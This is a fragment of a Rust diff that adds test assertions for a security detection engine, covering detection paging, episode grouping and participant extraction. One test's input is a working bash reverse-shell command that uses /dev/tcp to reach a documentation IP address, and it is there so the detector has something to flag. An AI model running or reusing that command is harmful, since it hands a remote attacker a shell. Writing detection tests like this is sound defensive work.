+    let inputs = detections::Inputs { rules:&rules, settings:&settings, catalog:None };
+    let disk = detections::run_stored(&inputs, &Source::Events(events.iter().collect())).unwrap();
+    let page = disk.page(5,0,20,None,None).unwrap();
+    assert_eq!(page["episodes"].as_array().unwrap().len(),1);
+    assert_eq!(page["episodes"][0]["id"],group.id);
+    assert_eq!(page["episodes"][0]["record_count"],3);
+    assert_eq!(page["counts_by_level"],json!(memory.counts_by_level));
+    for d in page["detections"].as_array().unwrap() {
+        assert_eq!(d["context_only"],d["evidence_level"].as_u64().unwrap()<5);
+    }
+    assert!(memory.detections.len()>3, "group occurrences count events, not rule matches");
+}
+
+#[test]
 fn security_large_episode_filter_keeps_visible_witness_and_all_members() {
     let mut meta = run(&[process(0, 0, "bash -i >& /dev/tcp/192.0.2.1/4444 0>&1")]);
     let template = meta.detections.iter().find(|d| d.rule == "attempt.reverse-shell.process").unwrap().clone();
@@ -213,6 +877,10 @@ fn security_large_episode_filter_keeps_visible_witness_and_all_members() {
         d.event_ids.push(i + 1);
         d.evidence.event_refs.push(member.event_ref.clone());
         d.evidence.evidence_members.push(member);
+        if i==204 {
+            d.participants=crate::security_participants::extract(
+                &event(205,0,json!({"source.ip":"192.0.2.204","service.name":"last-member"})),&Default::default(),&d.rule,&d.tactics);
+        }
         writer.push(&d).unwrap();
     }
     let stored = writer.finish(meta).unwrap();
@@ -222,6 +890,10 @@ fn security_large_episode_filter_keeps_visible_witness_and_all_members() {
     assert_eq!(page["detections"][0]["id"], "finding-204");
     assert_eq!(page["detections"][0]["context_only"], false);
     assert_eq!(page["episodes"][0]["members_complete"], false);
+    let first=stored.page(5,0,20,None,None).unwrap();
+    assert!(!first["detections"].as_array().unwrap().iter().any(|d|d["id"]=="finding-204"));
+    assert!(first["episodes"][0]["participants"]["facts"].as_array().unwrap().iter().any(|f|f["value"]=="192.0.2.204"),"Participants include members outside the preview and selected evidence level");
+    assert_eq!(page["episodes"][0]["participants"],first["episodes"][0]["participants"]);
     let id = page["episodes"][0]["id"].as_str().unwrap();
     let mut found = std::collections::HashSet::new();
     let mut offset = 0;
